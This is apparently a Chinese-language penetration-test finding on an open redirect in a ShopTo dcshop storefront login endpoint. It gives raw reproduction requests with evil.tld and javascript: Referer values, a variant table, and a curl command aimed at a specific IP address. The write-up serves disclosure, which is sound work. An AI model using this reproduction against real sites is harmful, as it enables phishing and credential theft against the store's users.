# ShopTo 源站 dcshop 登录失败开放重定向（Location 跟随 Referer 头）

## 指纹 / 命中条件
- 组件：DcCMS 2015 / dcshop storefront，登录端点 `POST /en/login/?action=shop_login`
- 触发：任意一次登录失败（密码错即可），302 的 Location = 请求的 Referer 头 + `?login_error=true`
- 无白名单：外部域 / 协议相对 `//host` / `javascript:` 伪协议全部照写

## 原始复现报文（curl 直连源站，2026-11-11 15:33 GMT，ARTEX 执行机 curl 8.x）

### ① 基线（外部域）
```
POST /en/login/?action=shop_login HTTP/1.0
Host: localhost
Referer: https://evil.tld/x.html
Content-Type: application/x-www-form-urlencoded

action=shop_login&input_email=any@x.com&input_password=wrong&storefront_token=
```
回显：
```
HTTP/1.0 302 Found
Location: https://evil.tld/x.html?login_error=true
Set-Cookie: login_used_data=any%40x.com; Max-Age=2; path=/; secure; HttpOnly
```

### ② javascript: 伪协议（证明原始反射）
同上，`Referer: javascript:alert(1)`
```
HTTP/1.0 302 Found
Location: javascript:alert(1)?login_error=true
```

### ③ 协议相对 URL
同上，`Referer: //evil.tld`
```
HTTP/1.0 302 Found
Location: //evil.tld?login_error=true
```

### ④ 排除 Host/X-Forwarded-Host 驱动
去掉 Referer；另测 `X-Forwarded-Host: evil.tld` → 两次均 `Location: ?login_error=true`

### 变体对照（Location 与 Referer 一一对应，含 query/fragment）
| Referer | Location |
|---|---|
| https://a.evil/1 | https://a.evil/1?login_error=true |
| https://b.evil/2?x=y | https://b.evil/2?x=y&login_error=true |
| https://c.evil/3#frag | https://c.evil/3#frag?login_error=true |
| //evil.tld | //evil.tld?login_error=true |
| javascript:alert(1) | javascript:alert(1)?login_error=true |
| （无） | ?login_error=true |

## 一键验证命令
```bash
curl -sk --http1.0 -H "Host: localhost" -H "Referer: https://a.evil/1" \
  -X POST --data "action=shop_login&input_email=x@x.com&input_password=y&storefront_token=" \
  "https://3.8.196.174/en/login/?action=shop_login" -D - -o /dev/null
```

## 影响
- CWE-601 开放重定向：从 shopto 可信域 302 到攻击者站点，用于钓鱼、OAuth/凭据窃取前置、可信域外带。
- 接受 `javascript:` 说明取值为原始反射、无任何 scheme 校验。
